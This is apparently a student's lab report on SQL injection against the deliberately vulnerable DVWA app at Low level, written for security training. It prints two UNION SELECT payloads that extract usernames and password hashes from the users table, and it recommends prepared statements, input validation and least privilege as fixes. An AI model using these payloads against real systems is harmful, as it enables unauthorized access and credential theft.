# SQL Injection – Level: Low

## 🔍 Extended Payload Used

```
1 UNION SELECT user, password FROM users LIMIT 1,1
1 UNION SELECT user, password FROM users LIMIT 2,1
```

## ✅ Result

- **ID:** `1 UNION SELECT user, password FROM users LIMIT 1,1 1 UNION SELECT user, password FROM users LIMIT 2,1`
- **First name:** `admin`
- **Surname:** `admin`
- **No error appeared**, and the injection successfully displayed credentials from the `users` table.

## 🖼️ Screenshots

### Screenshot 1 – Single record output:
![SQLI-1](/SQLI-1.png)

### Screenshot 2 – HTML structure of output:
![SQLI-2](/SQLI-2.png)

## 🛠️ Recommendation

To prevent SQL injection on this level, it's recommended to:

- Use **prepared statements** with bound parameters (e.g., `mysqli_prepare()` or `PDO::prepare()` in PHP).
- Implement **server-side input validation** and type checking.
- Use **least privilege** for DB users.
- **Disable detailed SQL errors** in production environments.
- Apply **Web Application Firewall (WAF)** for extra protection.

## 👤 Tester

**Name:** Tetiana Trunova  
**Platform:** DVWA – SQL Injection (Low)  
**Environment:**  
- Kali Linux (Attacker)  
- Ubuntu (DVWA Target)  
- Browser DevTools used for inspection

## 🧩 Conclusion

The SQL Injection vulnerability on Low level allowed direct injection of arbitrary SQL via the `id` parameter. Using the `UNION SELECT` technique and adjusting the column count, we successfully extracted usernames and hashed passwords from the `users` table. This highlights the critical risk of unsanitized input and reinforces the importance of using parameterized queries and secure development practices.
